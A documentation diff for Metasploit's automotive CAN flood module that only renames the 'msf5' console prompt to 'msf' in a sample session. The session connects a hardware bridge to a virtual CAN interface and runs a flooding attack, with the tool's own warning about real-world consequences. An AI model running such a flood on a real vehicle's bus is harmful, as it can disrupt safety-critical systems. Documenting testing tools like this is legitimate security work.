@@ -45,17 +45,17 @@ The user must know a list of frames that generate an effect on the car. This is 
 You can test the module by setting a virtual CAN interface and then execute the commands, thus obtaining the underlying output:
 
 ```
-msf5 > use auxiliary/server/local_hwbridge
-msf5 auxiliary(server/local_hwbridge) > run
+msf > use auxiliary/server/local_hwbridge
+msf auxiliary(server/local_hwbridge) > run
 [*] Auxiliary module running as background job 0.
 
 [*] Using URL: http://0.0.0.0:8080/trycanbus
 [*] Local IP: http://10.0.2.15:8080/trycanbus
 [*] Server started.
-msf5 auxiliary(server/local_hwbridge) > use auxiliary/client/hwbridge/connect
-msf5 auxiliary(client/hwbridge/connect) > set targeturi trycanbus
+msf auxiliary(server/local_hwbridge) > use auxiliary/client/hwbridge/connect
+msf auxiliary(client/hwbridge/connect) > set targeturi trycanbus
 targeturi => trycanbus
-msf5 auxiliary(client/hwbridge/connect) > run
+msf auxiliary(client/hwbridge/connect) > run
 
 [*] Attempting to connect to 127.0.0.1...
 [*] Hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2019-03-20 03:17:55 -0400
@@ -65,12 +65,12 @@ msf5 auxiliary(client/hwbridge/connect) > run
 [!]          could have real world consequences.  Use this module in a controlled testing
 [!]          environment and with equipment you are authorized to perform testing on.
 [*] Auxiliary module execution completed
-msf5 auxiliary(client/hwbridge/connect) > use post/hardware/automotive/can_flood 
-msf5 post(hardware/automotive/can_flood) > set canbus vcan0
+msf auxiliary(client/hwbridge/connect) > use post/hardware/automotive/can_flood 
+msf post(hardware/automotive/can_flood) > set canbus vcan0
 canbus => vcan0
-msf5 post(hardware/automotive/can_flood) > set session 1
+msf post(hardware/automotive/can_flood) > set session 1
 session => 1
-msf5 post(hardware/automotive/can_flood) > run
+msf post(hardware/automotive/can_flood) > run
 
 [*]  -- FLOODING -- 
 [*] Post module execution completed
